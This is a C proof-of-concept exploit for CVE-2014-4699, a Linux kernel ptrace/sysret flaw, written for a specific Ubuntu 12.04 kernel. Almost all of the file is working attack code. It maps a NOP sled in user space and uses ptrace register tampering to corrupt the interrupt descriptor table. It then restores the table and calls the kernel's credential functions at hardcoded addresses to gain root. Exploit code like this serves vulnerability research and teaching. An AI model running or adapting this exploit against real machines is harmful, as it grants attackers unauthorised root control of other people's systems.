/**
 * CVE-2014-4699 ptrace/sysret PoC
 * by Vitaly Nikolenko
 * vnik@hashcrack.org
 *
 * > gcc -O2 poc_v0.c
 *
 * This code is kernel specific. On Ubuntu 12.04.0 LTS (3.2.0-23-generic), the
 * following will trigger the #GP in sysret and overwrite the #PF handler so we
 * can land to our NOP sled mapped at 0x80000000.
 * However, once landed, the IDT will be trashed. We can either attempt to
 * restore it (then escalate privileges and execute our shellcode) or find
 * something else to overwrite that would transfer exec flow to our controlled
 * user-space address. Since 3.10.something, IDT is read-only anyway. If you
 * have any ideas, let me know.
 *
 * Improved by Gianluca Pacchiella <gp@ktln2.org> restoring the IDT and completing
 * the payload with some real code in userspace. BTW a lot of improvement is
 * possible, your turn dude.
 */
 
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <assert.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <sys/user.h>
#include <unistd.h>
#include <sys/mman.h>
#include <errno.h>

#define SIZE  0x10000000

typedef int __attribute__((regparm(3))) (*commit_creds_fn)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred_fn)(unsigned long cred);

// desc_defs.h
/* 16byte gate */
struct gate_struct64 {
	uint16_t offset_low;
	uint16_t segment;
	unsigned ist : 3, zero0 : 5, type : 5, dpl : 2, p : 1;
	uint16_t offset_middle;
	uint32_t offset_high;
	uint32_t zero1;
} __attribute__((packed));

typedef struct gate_struct64 gate_desc;

void launch_shell (void) {
    printf(" [+] got root?\n");
    system("id");
    printf(" [+] exiting as a child\n");
    exit(0);
}

struct trap_frame {
    uint64_t eip;    // instruction pointer
    uint64_t cs;     // code segment
    uint64_t eflags; // CPU flags
    uint64_t esp;    // stack pointer
    uint64_t ss;     // stack segment
}__attribute__ (( packed ));

struct trap_frame tf;

void prepare_tf ( void ) {
    // YOU CANNOT PUSH/POP directly CS&SS
    asm("movq %cs, %rax; pushq %rax;   popq tf+8;"
        "pushfq;     popq tf+16;"
        "pushq %rsp; popq tf+24;"
        "movq %ss, %rax; pushq %rax;  popq tf+32;");
    tf.eip = (uint64_t)&launch_shell;
    tf.esp -= 1024; // unused part of stack
}

/*
 * gefâž¤  print idt_table[14]
 * $24 = {
 *  offset_low = 0xcc00, 
 *  segment = 0x10, 
 *  ist = 0x0, 
 *  zero0 = 0x0, 
 *  type = 0xe, 
 *  dpl = 0x0, 
 *  p = 0x1, 
 *  offset_middle = 0x8165, 
 *  offset_high = 0xffffffff, 
 *  zero1 = 0x0
 * }
 */

// https://www.geeksforgeeks.org/multiline-macros-in-c/
#define set_entry(obj,n,_ist,_dpl,middle,low) ({  \
	obj[n].offset_low = low;            \
    obj[n].segment = 0x10;              \
    obj[n].offset_middle = middle;      \
    obj[n].offset_high = 0xffffffff;    \
    obj[n].ist = _ist;                  \
    obj[n].zero0 = 0x0;                 \
    obj[n].zero1 = 0x0;                 \
    obj[n].dpl = _dpl;                  \
    obj[n].type = 0xe;                  \
    obj[n].p = 0x1;                     \
    })

void __attribute__((regparm(3))) payload() {
    gate_desc* idt_table = (void*)0xffffffff81dd7000;

    set_entry(idt_table,  0, 0x0, 0x0, 0x8166, 0x69f0);
    set_entry(idt_table,  1, 0x4, 0x0, 0x8165, 0xca80);
    set_entry(idt_table,  2, 0x3, 0x0, 0x8165, 0xce90);
    set_entry(idt_table,  3, 0x4, 0x3, 0x8165, 0xcac0);

    set_entry(idt_table,  5, 0x0, 0x0, 0x8166, 0x6a30);
    set_entry(idt_table,  6, 0x0, 0x0, 0x8166, 0x6a50);
    set_entry(idt_table,  7, 0x0, 0x0, 0x8166, 0x6a70);

    set_entry(idt_table, 10, 0x0, 0x0, 0x8166, 0x6ae0);

    set_entry(idt_table, 12, 0x1, 0x0, 0x8165, 0xcb00);
    set_entry(idt_table, 13, 0x0, 0x0, 0x8165, 0xcba0);
    set_entry(idt_table, 14, 0x0, 0x0, 0x8165, 0xcc00);
    set_entry(idt_table, 15, 0x0, 0x0, 0x8166, 0x6b40);
    set_entry(idt_table, 16, 0x0, 0x0, 0x8166, 0x6b60);
    set_entry(idt_table, 17, 0x0, 0x0, 0x8166, 0x6b80);

	commit_creds_fn commit_creds = (commit_creds_fn)0xffffffff81091630;
	prepare_kernel_cred_fn prepare_kernel_cred = (prepare_kernel_cred_fn)0xffffffff810918e0;
	commit_creds(prepare_kernel_cred((uint64_t)NULL));

	asm("swapgs;"
        "mov $tf, %rsp;"
        "iretq;");
}

int main() {
    struct user_regs_struct regs;
    uint8_t *trampoline, *tmp;
    int status;

    struct {
        uint16_t limit;
        uint64_t addr;
    } __attribute__((packed)) idt;

    // MAP_POPULATE so we don't trigger extra #PF
    trampoline = mmap((void*)0x80000000, SIZE, 7|PROT_EXEC|PROT_READ|PROT_WRITE, 0x32|MAP_FIXED|MAP_POPULATE|MAP_GROWSDOWN, 0,0);
    assert(trampoline == (void*)0x80000000);
    memset(trampoline, 0x90, SIZE); 
    tmp = trampoline;
    tmp += SIZE - 4096;
    memcpy(tmp, &payload, 4096);
    memcpy(tmp-13,"\x0f\x01\xf8\xe8\5\0\0\0\x0f\x01\xf8\x48\xcf", 13);

    prepare_tf();

    pid_t chld;

    if ((chld = fork()) < 0) {
        perror("fork");
        exit(1);
    }

    printf(" [+] pid=%d\n", chld);

    if (chld == 0) { 
        if (ptrace(PTRACE_TRACEME, 0, 0, 0) != 0) {
            perror("PTRACE_TRACEME");
            exit(1);
        }
        raise(SIGSTOP);
        fork();

        return 0;
    }

    asm volatile("sidt %0" : "=m" (idt));
    printf("IDT addr = 0x%lx\n", idt.addr);

    waitpid(chld, &status, 0);

    ptrace(PTRACE_SETOPTIONS, chld, 0, PTRACE_O_TRACEFORK); 

    ptrace(PTRACE_CONT, chld, 0, 0);

    waitpid(chld, &status, 0); 

    ptrace(PTRACE_GETREGS, chld, NULL, &regs);
    regs.rdi = 0x0000000000000000;
    regs.rip = 0x8fffffffffffffff;
    regs.rsp = idt.addr + 14*16 + 8 + 0xb0 - 0x78;

    // attempt to restore the IDT
    regs.rdi = 0x0000000000000000;
    regs.rsi = 0x81658e000010cbd0;
    regs.rdx = 0x00000000ffffffff;
    regs.rcx = 0x81658e000010cba0;
    regs.rax = 0x00000000ffffffff;
    regs.r8  = 0x81658e010010cb00;
    regs.r9  = 0x00000000ffffffff;
    regs.r10 = 0x81668e0000106b10;
    regs.r11 = 0x00000000ffffffff;
    regs.rbx = 0x81668e0000106ac0;
    regs.rbp = 0x00000000ffffffff;
    regs.r12 = 0x81668e0000106ac0;
    regs.r13 = 0x00000000ffffffff;
    regs.r14 = 0x81668e0200106a90;
    regs.r15 = 0x00000000ffffffff;
    ptrace(PTRACE_SETREGS, chld, NULL, &regs);

    ptrace(PTRACE_CONT, chld, 0, 0);

    ptrace(PTRACE_DETACH, chld, 0, 0);

    wait(&status);
    printf(" [!] exiting as a father\n");

}
